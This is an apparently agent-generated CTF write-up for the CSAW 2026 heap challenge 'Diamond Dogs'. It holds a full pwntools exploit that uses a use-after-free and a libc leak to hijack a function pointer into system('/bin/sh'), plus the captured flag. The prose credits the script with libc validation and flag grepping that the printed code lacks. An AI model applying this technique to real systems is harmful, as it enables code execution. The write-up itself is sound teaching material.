---
title: "Diamond Dogs"
ctf: "CSAW CTF Qualifications 2026"
date: 2026-09-19
category: pwn
difficulty: medium
points: 381
flag_format: "csaw{...}"
author: "cursor-grok-diamond-dogs"
---

# Diamond Dogs

## Challenge Information

- **Name:** Diamond Dogs
- **Category:** Pwn
- **ID:** 22
- **Points:** 381
- **Author:** WubberDuckkie
- **Libc:** Ubuntu 20.04 glibc 2.31 (bundled `libc-2.31.so` / `ld-2.31.so`)
- **Flag:** `csaw{w3dd1ngs_4r3_b4s1c4lly_fun3r4ls_w1th_c4k3}`

## Summary

`guard-dog` is a no-PIE kennel/note heap manager. `release` frees a dog and
never NULLs the slot; `command` still does `call [dog+0x18]`. A same-size note
reallocates that 0x30 tcache chunk and overwrites the function pointer. A
shredded 0x420 note leaks libc from the unsorted bin. Overwrite `fn_ptr` with
`system` and the dog name with `/bin/sh`.

## Solution

### Step 1: Layout

Protections: Partial RELRO, no canary, NX, **no PIE** (`0x400000`). All kennel
ops are inlined in `main`.

| Object | Alloc | Fields |
| --- | --- | --- |
| dog | `malloc(0x20)` → 0x30 tcache | `name[24]` at `+0`, `fn_ptr` at `+0x18` (`woof`) |
| note | `malloc(size)` for `size in 1..0x1000` | raw buffer; `write(1, ptr, note_sz)` on read |

BSS: `note_sz` `0x4040a0`, `notes` `0x4040e0`, `dogs` `0x404120`.

`release` / `shred`:

```
mov rdi, dogs[idx]     ; or notes[idx]
test rdi, rdi
call free
puts("dog released…")  ; no store of 0 back into the slot
```

`command`:

```
mov rax, dogs[idx]
call qword ptr [rax+0x18]    ; rdi = dog
```

Occupancy is pointer-not-NULL only, so a freed dog is still callable.

### Step 2: Leak + overlap

1. File a 0x420 note (above tcache max) and a 0x20 guard, then shred the large
   one. `read` of the stale pointer returns unsorted-bin `fd` /
   `&main_arena+0x60`. On this libc, `fd - __malloc_hook - 0x70` is a
   page-aligned base; confirm it resolves `/bin/sh` before trusting `system`.
2. Adopt dog 0, release it (UAF into 0x30 tcache), file a 0x20 note:

   ```
   payload = b"/bin/sh\0" + pad + p64(system)
   ```

   The note write lands on the freed dog. `command 0` is `system("/bin/sh")`.

No tcache poison and no `__free_hook` are required.

### Step 3: Reproduce

```bash
# local (bundled glibc 2.31)
python3 agent_workspace/solve.py

# remote
python3 agent_workspace/solve.py HOST:1025
```

Remote run against the organizer instance printed:

```
SHELL_OK
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
csaw{w3dd1ngs_4r3_b4s1c4lly_fun3r4ls_w1th_c4k3}
```

CTFd challenge 22: **correct**.

```python
#!/usr/bin/env python3
"""Diamond Dogs — UAF leak + dog/note overlap. See agent_workspace/solve.py."""
from pwn import *
import os, re, sys

context.arch = "amd64"
HERE = os.path.dirname(os.path.abspath(__file__))
FILES = os.path.join(HERE, "extracted", "files")
if not os.path.isfile(os.path.join(FILES, "guard-dog")):
    FILES = os.path.normpath(os.path.join(HERE, "..", "agent_workspace", "extracted", "files"))
elf = ELF(os.path.join(FILES, "guard-dog"), checksec=False)
libc = ELF(os.path.join(FILES, "libc-2.31.so"), checksec=False)

def adopt(io, i):
    io.sendlineafter(b"> ", b"1"); io.sendlineafter(b"kennel (0-7): ", str(i).encode())
    io.sendafter(b"name: ", b"A" * 0x18)
def command(io, i):
    io.sendlineafter(b"> ", b"2"); io.sendlineafter(b"kennel: ", str(i).encode())
def release(io, i):
    io.sendlineafter(b"> ", b"3"); io.sendlineafter(b"kennel: ", str(i).encode())
def note(io, s, size, data):
    io.sendlineafter(b"> ", b"4"); io.sendlineafter(b"note slot (0-7): ", str(s).encode())
    io.sendlineafter(b"size: ", str(size).encode()); io.sendafter(b"contents: ", data)
def read_note(io, s, n):
    io.sendlineafter(b"> ", b"5"); io.sendlineafter(b"note slot: ", str(s).encode())
    io.recvuntil(b"contents: "); return io.recvn(n, timeout=5)
def shred(io, s):
    io.sendlineafter(b"> ", b"6"); io.sendlineafter(b"note slot: ", str(s).encode())

io = process(os.path.join(FILES, "guard-dog")) if len(sys.argv) < 2 else remote(*sys.argv[1].split(":") if ":" in sys.argv[1] else (sys.argv[1], int(sys.argv[2])))
note(io, 0, 0x420, b"L" * 0x420); note(io, 1, 0x20, b"G" * 0x20); shred(io, 0)
fd = u64(read_note(io, 0, 0x20)[:8])
libc.address = fd - libc.symbols["__malloc_hook"] - 0x70
adopt(io, 0); release(io, 0)
note(io, 2, 0x20, b"/bin/sh\x00" + b"\x00" * 16 + p64(libc.sym.system))
command(io, 0)
io.sendline(b"cat flag.txt; echo SHELL_OK")
print(io.recvrepeat(3).decode(errors="replace"))
```

The checked-in script is `agent_workspace/solve.py` (copied to `agent_result/solve.py`). It locates the bundled binary, supports local and remote, validates the libc base, and greps `csaw{...}`.

## Flag

```
csaw{w3dd1ngs_4r3_b4s1c4lly_fun3r4ls_w1th_c4k3}
```
